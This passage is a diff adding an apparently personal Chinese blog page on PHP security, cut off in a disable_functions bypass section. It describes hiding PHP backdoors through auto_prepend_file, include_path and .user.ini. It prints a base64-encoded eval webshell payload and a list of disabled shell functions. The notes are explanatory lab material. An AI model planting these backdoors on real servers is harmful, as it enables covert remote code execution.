@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="PHP安全PHP后门PHP配置可被修改的设定范围在PHP中有四种模式，他们定义了PHP的相关配置信息可以在那些范围内被修改。    模式 含义    PHP_INI_USER 可在用户脚本（例如ini_set()或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定   PHP_INI_PERDIR 可在 php.ini，.htaccess 或 httpd.conf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP安全-1">
+<meta property="og:url" content="http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="steady&#39;s blog">
+<meta property="og:description" content="PHP安全PHP后门PHP配置可被修改的设定范围在PHP中有四种模式，他们定义了PHP的相关配置信息可以在那些范围内被修改。    模式 含义    PHP_INI_USER 可在用户脚本（例如ini_set()或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定   PHP_INI_PERDIR 可在 php.ini，.htaccess 或 httpd.conf">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-12-05T21:23:02.000Z">
+<meta property="article:modified_time" content="2020-11-27T10:50:33.301Z">
+<meta property="article:author" content="steady">
+<meta property="article:tag" content="PHP安全">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PHP安全-1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="steady's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/12/07/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/12/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&text=PHP安全-1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&is_video=false&description=PHP安全-1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP安全-1&body=Check out this article: http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&name=PHP安全-1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&t=PHP安全-1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">PHP安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%90%8E%E9%97%A8"><span class="toc-number">1.1.</span> <span class="toc-text">PHP后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E9%85%8D%E7%BD%AE%E5%8F%AF%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E8%AE%BE%E5%AE%9A%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.1.</span> <span class="toc-text">PHP配置可被修改的设定范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-ini"><span class="toc-number">1.1.2.</span> <span class="toc-text">php.ini</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#auto-prepend-file%E4%B8%8Eauto-append-file"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">auto_prepend_file与auto_append_file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#include-path"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">include_path</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini"><span class="toc-number">1.1.3.</span> <span class="toc-text">.user.ini</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">1.2.</span> <span class="toc-text">绕过disable_function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#disable-functions%E4%BD%9C%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">disable_functions作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84PHP%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">常规PHP文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">蚁剑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable-functions%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">disable_functions绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E2%80%93%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93LD-PRELOAD"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">linux–蚁剑插件–LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%93%E5%90%88mail-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text">结合mail 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text">蚁剑插件实现思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E2%80%93%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93Fastcgi-PHP-FPM"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">linux–蚁剑插件–Fastcgi&#x2F;PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0fast-cgi%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">1.2.2.2.1.1.</span> <span class="toc-text">伪造fast-cgi数据包</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8webshell%E6%94%BB%E5%87%BBPHP-FPM%E2%80%93%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6"><span class="toc-number">1.2.2.2.1.2.</span> <span class="toc-text">使用webshell攻击PHP-FPM–蚁剑插件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win-%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">win-系统组件绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ImageMagick%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">ImageMagick漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93Apache-Mod-CGI"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">蚁剑插件–Apache Mod CGI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">1.2.2.5.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93Json-Serializer-UAF"><span class="toc-number">1.2.2.6.</span> <span class="toc-text">蚁剑插件–Json Serializer UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">1.2.2.6.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93HP7-GC-with-Certain-Destructors-UAF"><span class="toc-number">1.2.2.7.</span> <span class="toc-text">蚁剑插件–HP7 GC with Certain Destructors UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-number">1.2.2.7.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93FFI-Bypass"><span class="toc-number">1.2.2.8.</span> <span class="toc-text">蚁剑插件–FFI Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PCNTL-Bypass"><span class="toc-number">1.2.2.9.</span> <span class="toc-text">PCNTL Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXIM-Bypass"><span class="toc-number">1.2.2.10.</span> <span class="toc-text">EXIM Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">open_basedir代码绕过总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open-basedir%E4%BD%9C%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">open_basedir作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87open-basedir"><span class="toc-number">1.3.2.</span> <span class="toc-text">绕过open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">通过系统命令执行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glob-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">glob:&#x2F;&#x2F;伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#scandir-glob"><span class="toc-number">1.3.2.2.1.</span> <span class="toc-text">scandir()+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#opendir-readdir-glob"><span class="toc-number">1.3.2.2.2.</span> <span class="toc-text">opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ini-set%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">ini_set设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#symlink-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">symlink()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text"></span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PHP安全-1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">steady</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-05T21:23:02.000Z" itemprop="datePublished">2019-12-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PHP%E5%AE%89%E5%85%A8/" rel="tag">PHP安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1><h2 id="PHP后门"><a href="#PHP后门" class="headerlink" title="PHP后门"></a>PHP后门</h2><h3 id="PHP配置可被修改的设定范围"><a href="#PHP配置可被修改的设定范围" class="headerlink" title="PHP配置可被修改的设定范围"></a>PHP配置可被修改的设定范围</h3><p>在PHP中有四种模式，他们定义了PHP的相关配置信息可以在那些范围内被修改。</p>
+<table>
+<thead>
+<tr>
+<th align="left">模式</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>PHP_INI_USER</code></td>
+<td align="left">可在用户脚本（例如ini_set()或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td>
+</tr>
+<tr>
+<td align="left"><code>PHP_INI_PERDIR</code></td>
+<td align="left">可在 php.ini，.htaccess 或 httpd.conf 中设定</td>
+</tr>
+<tr>
+<td align="left"><code>PHP_INI_SYSTEM</code></td>
+<td align="left">可在 php.ini 或 httpd.conf 中设定</td>
+</tr>
+<tr>
+<td align="left"><code>PHP_INI_ALL</code></td>
+<td align="left">可在任何地方设定</td>
+</tr>
+</tbody></table>
+<h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><h4 id="auto-prepend-file与auto-append-file"><a href="#auto-prepend-file与auto-append-file" class="headerlink" title="auto_prepend_file与auto_append_file"></a>auto_prepend_file与auto_append_file</h4><p>在php.ini的数据处理配置选项中有两个配置项<code>auto_prepend_file与auto_append_file</code>。</p>
+<ul>
+<li><p>auto_prepend_file的作用是在php程序加载执行第一个php文件之前加载指定的php文件。</p>
+</li>
+<li><p>auto_append_file则是加载执行完成后加载指定的php文件。</p>
+</li>
+</ul>
+<p>查询php手册可以看到该两项的修改范围为<code>PHP_INI_PERDIR</code>，能在php.ini、.htaccess、httpd.conf设置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file	NULL	PHP_INI_PERDIR	 </span><br><span class="line">auto_append_file	NULL	PHP_INI_PERDIR</span><br></pre></td></tr></table></figure>
+
+<h4 id="include-path"><a href="#include-path" class="headerlink" title="include_path"></a>include_path</h4><p>include_path的作用就是设置用include()函数包函文件时的路径。可修改范围为<code>PHP_INI_ALL</code>。</p>
+<p>比如：</p>
+<p>在/usr/good/目录下有一个good.php文件，我们在php某一个文件中包含该文件，有两种方式：</p>
+<ul>
+<li><p>没有设置include_path，可以使用相对路径或者绝对路径来使用include函数进行包含。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;&#x2F;usr&#x2F;good&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果设置了include_path=”/usr/good/“，则可以在include函数中直接包含文件，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;goood.php&quot;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>设置php的include_path</p>
+<ul>
+<li><p>修改php.ini文件中的include_path项</p>
+</li>
+<li><p>使用ini_set方法，对于无法修改php.ini的情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;include_path&quot;, &quot;.:..&#x2F;:.&#x2F;include:..&#x2F;include)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include_path &#x3D; &quot;.:&#x2F;Applications&#x2F;MAMP&#x2F;bin&#x2F;php&#x2F;php5.6.40&#x2F;lib&#x2F;php:&#x2F;tmp&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file &#x3D; &quot;steady.php&quot;</span><br><span class="line">auto_append_file &#x3D;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  &#x2F;tmp ls</span><br><span class="line">steady.php</span><br><span class="line">➜  &#x2F;tmp cat steady.php</span><br><span class="line">&lt;?php echo 123;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问任意php文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;list.php</span><br></pre></td></tr></table></figure>
+
+<p>输出123。</p>
+<p>另外对于<code>auto_prepend_file</code>可以使用base64进行编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;&quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>这里要注意：</p>
+<p>如果某项PHP配置，具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式，则可以在 <code>.user.ini</code> 文件中进行修改。</p>
+<p><code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><p>两种方式的应用场景：</p>
+<p>目标系统不允许上传PHP文件，我们可以上传<code>.ini</code>文件和一个包含webshell的其他后缀文件。</p>
+</li>
+<li><p>如果修改<code>php.ini</code>，需要重新启动服务器才能生效。</p>
+<p>如果修改<code>.user.ini</code>，不需要重新启动服务器，可以设置默认时间即可重新加载。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_ini.cache_ttl &#x3D; 10  &#x2F;&#x2F;设置加载时间为10s 不需要重启apache时间一到自动加载。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>php.ini</code>大多用于隐藏PHP后门，而<code>.user.ini</code>大多用于文件上传。</p>
+</li>
+<li><p><code>.user.ini</code>只能在服务器使用CGI/FastCGI模式中使用。</p>
+</li>
+</ul>
+<h2 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过<code>disable_function</code></h2><h3 id="disable-functions作用"><a href="#disable-functions作用" class="headerlink" title="disable_functions作用"></a>disable_functions作用</h3><h4 id="常规PHP文件"><a href="#常规PHP文件" class="headerlink" title="常规PHP文件"></a>常规PHP文件</h4><p>可以对特定的PHP函数进行禁用，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passthru exec system chroot chgrp chown shell_exec proc_open proc_get_status popen</span><br><span class="line">ini_alter ini_restore dl openlog syslog phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>本地构造php文件，<code>delete.php</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在php.ini中配置函数，此时我们配置为空：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; </span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;delete.php</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo正常回显。</p>
+<p>如果修改配置为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>出现报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: phpinfo() has been disabled for security reasons in F:\webapp\Apache\htdocs\delete.php on line 2</span><br></pre></td></tr></table></figure>
+
+<h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><p>没有函数限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; </span><br></pre></td></tr></table></figure>
+
+<p>使用蚁剑连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apple:&#x2F;Applications&#x2F;MAMP&#x2F;htdocs) $ ls</span><br><span class="line">1.png</span><br><span class="line">DVWA</span><br><span class="line">MVC1</span><br><span class="line">conn.php</span><br><span class="line">delete.php</span><br><span class="line">libs</span><br><span class="line">list.php</span><br><span class="line">php</span><br><span class="line">phpinfo.php</span><br><span class="line">sqli</span><br><span class="line">upload</span><br><span class="line">upload-labs</span><br><span class="line">xss</span><br></pre></td></tr></table></figure>
+
+<p>添加函数限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</span><br></pre></td></tr></table></figure>
+
+<p>使用蚁剑执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(apple:&#x2F;Applications&#x2F;MAMP&#x2F;htdocs) $ ls</span><br><span class="line">ret&#x3D;127</span><br></pre></td></tr></table></figure>
+
+<h3 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h3><h4 id="linux–蚁剑插件–LD-PRELOAD"><a href="#linux–蚁剑插件–LD-PRELOAD" class="headerlink" title="linux–蚁剑插件–LD_PRELOAD"></a>linux–蚁剑插件–LD_PRELOAD</h4><p>LD_PRELOAD 是Linux的环境变量，它允许你定义在程序运行前优先加载的别的动态链接库，甚至覆盖正常的函数库。</p>
+<p>例子：</p>
